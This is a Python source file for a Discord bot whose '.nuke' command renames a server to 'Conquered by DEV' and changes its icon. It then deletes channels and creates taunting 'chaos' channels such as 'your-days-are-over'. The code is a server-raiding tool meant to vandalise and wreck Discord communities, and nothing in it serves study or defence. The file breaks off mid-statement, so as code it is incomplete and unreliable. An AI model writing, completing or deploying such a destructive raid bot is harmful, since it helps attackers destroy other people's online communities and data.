import discord
from discord.ext import commands
import asyncio
import os
import random

intents = discord.Intents.all()
bot = commands.Bot(command_prefix='.', intents=intents)

@bot.event
async def on_ready():
    print(f"✅ Logged in as {bot.user}")

# === Nuke Command ===
@bot.command()
@commands.has_permissions(administrator=True)
async def nuke(ctx):
    guild = ctx.guild

    # Rename server and set scary icon
    try:
        with open("devpfp.png", "rb") as f:
            icon = f.read()
        await guild.edit(name="☠️ Conquered by DEV ☠️", icon=icon)
    except:
        await guild.edit(name="☠️ Conquered by DEV ☠️")

    await ctx.send("💣 Nuke protocol initiated... May god help y’all 😈")

    # Delete up to 2 channels
    deleted = 0
    for ch in guild.channels:
        if deleted >= 2:
            break
        try:
            await ch.delete()
            deleted += 1
        except:
            pass

    await asyncio.sleep(1)

    # Create chaos channels
    chaos_names = [
        "dev-was-here",
        "your-days-are-over",
        "bow-before-dev",
        "hellzone",
        "last-words"
    ]
    for name in chaos_names:
        await guild.create_text
